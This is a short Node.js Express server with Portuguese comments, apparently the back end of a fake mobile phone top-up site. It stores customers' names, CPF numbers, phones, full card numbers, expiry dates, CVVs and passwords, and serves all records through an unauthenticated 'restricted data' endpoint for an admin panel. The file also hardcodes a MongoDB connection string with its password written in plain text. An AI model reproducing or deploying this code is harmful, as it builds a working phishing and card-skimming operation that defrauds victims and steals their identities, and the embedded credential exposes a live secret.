const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONEXÃO COM O SEU MONGODB (Senha: Dks10dks@)
mongoose.connect('mongodb+srv://mateus:Dks10dks%40@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('✅ MongoDB Conectado!'))
  .catch(err => console.error('❌ Erro:', err));

// MODELO DE DADOS (Captura tudo: Operadora, CPF, Cartão, CVV, Senha)
const RecargaSchema = new mongoose.Schema({
    operadora: String, nome: String, cpf: String, telefone: String, 
    valor: String, cartao: String, data: String, cvv: String, senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

// SALVAR DADOS DO CLIENTE
app.post('/finalizar', async (req, res) => {
    try {
        const nova = new Recarga(req.body);
        await nova.save();
        res.status(200).send('OK');
    } catch (err) { res.status(500).send('Erro'); }
});

// ENVIAR DADOS PARA O SEU PAINEL ADMIN
app.get('/ver-dados-restritos', async (req, res) => {
    try {
        const dados = await Recarga.find().sort({ dataRegistro: -1 });
        res.json(dados);
    } catch (err) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Rodando na porta ${PORT}`));